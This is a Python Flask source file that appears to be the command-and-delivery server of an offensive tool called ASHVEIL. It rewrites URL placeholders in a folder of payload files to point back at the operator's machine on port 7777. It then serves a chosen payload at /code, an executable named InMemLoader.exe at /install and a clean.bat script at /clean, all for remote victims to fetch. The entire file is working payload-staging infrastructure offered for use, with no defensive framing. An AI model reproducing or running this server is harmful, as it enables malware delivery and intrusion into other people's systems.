from flask import Flask, request, send_from_directory, jsonify, Response
import os
import time
from blessed import Terminal
import socket

app = Flask(__name__)

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
CODE_DIR = os.path.join(CURRENT_DIR, "payloads")
UPLOAD_DIR = os.path.join(CURRENT_DIR, "uploads")
FILE_NAME = 'InMemLoader.exe'
clean_name = 'clean.bat'
forwarded = False

os.makedirs(CODE_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

available_code_files = [f for f in os.listdir(CODE_DIR) if os.path.isfile(os.path.join(CODE_DIR, f))]
selected_code_file = None

def info():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(" ░█████╗░░██████╗██╗░░██╗██╗░░░██╗███████╗██╗██╗░░░░░")
    print("  ██╔══██╗██╔════╝██║░░██║██║░░░██║██╔════╝██║██║░░░░░")
    print("  ███████║╚█████╗░███████║╚██╗░██╔╝█████╗░░██║██║░░░░░")
    print("  ██╔══██║░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║██║░░░░░")
    print("  ██║░░██║██████╔╝██║░░██║░░╚██╔╝░░███████╗██║███████╗")
    print("  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
    time.sleep(0.5)

def adjust_payload():
    global forwarded, available_code_files
    # Get the public IP or local IP based on the forwarded flag
    ip_address = "localhost"  # default local IP
    if forwarded:
        ip_address = socket.gethostbyname(socket.gethostname())  # Get the local machine IP

    # Iterate through all payload files in the directory
    for file_name in available_code_files:
        file_path = os.path.join(CODE_DIR, file_name)

        # Read the file and replace the URL
        with open(file_path, "r") as file:
            content = file.read()

        # Modify the URL in the selected code file
        new_content = content.replace("URL_PLACEHOLDER", f"http://{ip_address}:7777")

        # Write the changes back to the file
        with open(file_path, "w") as file:
            file.write(new_content)

        print(f"[*] Adjusted URL in {file_name} to {ip_address}")

def ask_if_forwarded():
    global forwarded  # Make sure we're modifying the global variable
    print("Do you have your port open?")
    term = Terminal()

    menu = ['Yes', 'No', 'Exit']
    selected = 0
    forwarded = None  # Initialize the variable

    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        print(term.clear)
        print("Do you have a forwarded port?")
        while True:
            print(term.move_yx(0, 0))
            for i, item in enumerate(menu):
                if i == selected:
                    print(term.underline + item + term.normal)
                else:
                    print(item)

            key = term.inkey()

            if key.name == 'KEY_UP' and selected > 0:
                selected -= 1
            elif key.name == 'KEY_DOWN' and selected < len(menu) - 1:
                selected += 1
            elif key.name == 'KEY_ENTER' or key == '\n':
                # Process the selection
                if menu[selected] == 'Yes':
                    forwarded = True
                elif menu[selected] == 'No':
                    forwarded = False
                elif menu[selected] == 'Exit':
                    print(term.move_yx(0, len(menu) + 1) + "Exiting...")
                    break  # Exit the loop and function

                # Once an option is selected, break the loop
                break

        # If 'Exit' is selected, we exit out of the program.
        if forwarded is None:
            print("No selection made. Exiting...")
            exit(0)  # Exit the program if no selection is made

# ==== Interactive Blessed Menu ====
def choose_code_file():
    global selected_code_file
    term = Terminal()
    index = 0

    menu_files = available_code_files + ['[ Exit ]']

    if not available_code_files:
        print("[-] No payloads found in /payload folder. Please add payloads first.")
        exit(1)

    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        print(term.clear)
        while True:
            print(term.move_yx(0, 0) + term.bold("==== Select a payload ====\n"))
            for i, file in enumerate(menu_files):
                if i == index:
                    print(term.reverse(file))
                else:
                    print(file)

            key = term.inkey()

            if key.name == 'KEY_UP':
                index = (index - 1) % len(menu_files)
            elif key.name == 'KEY_DOWN':
                index = (index + 1) % len(menu_files)
            elif key.name in ('KEY_ENTER', '\n'):
                selected = menu_files[index]
                if selected == '[ Exit ]':
                    print(term.clear + "[*] Exiting...")
                    time.sleep(0.5)
                    exit(0)
                else:
                    selected_code_file = selected
                    print(term.clear + f"[+] Selected: {selected_code_file}")
                    time.sleep(1)
                    break

# ==== Flask Routes ====
@app.route("/code")
def serve_code():
    if not selected_code_file:
        return "No code file selected.", 500
    try:
        with open(os.path.join(CODE_DIR, selected_code_file), 'r', encoding='utf-8') as f:
            return Response(f.read(), mimetype='text/plain')
    except Exception as e:
        return f"Error reading file: {str(e)}", 500

@app.route('/install', methods=['GET'])
def download_v2():
    try:
        file_path = os.path.join(CURRENT_DIR, FILE_NAME)
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{FILE_NAME} not found on the server.'}), 404
        return send_from_directory(CURRENT_DIR, FILE_NAME, as_attachment=True)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/clean', methods=['GET'])
def clean():
    try:
        file_path = os.path.join(CURRENT_DIR, clean_name)
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{clean_name} not found on the server.'}), 404
        return send_from_directory(CURRENT_DIR, clean_name, as_attachment=True)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==== Run Server ====
if __name__ == "__main__":
    info()
    ask_if_forwarded()  # Ask if port is forwarded
    adjust_payload()  # Adjust all payload files based on forwarding status
    choose_code_file()  # Let the user choose a payload file
    app.run(host="0.0.0.0", port=7777)
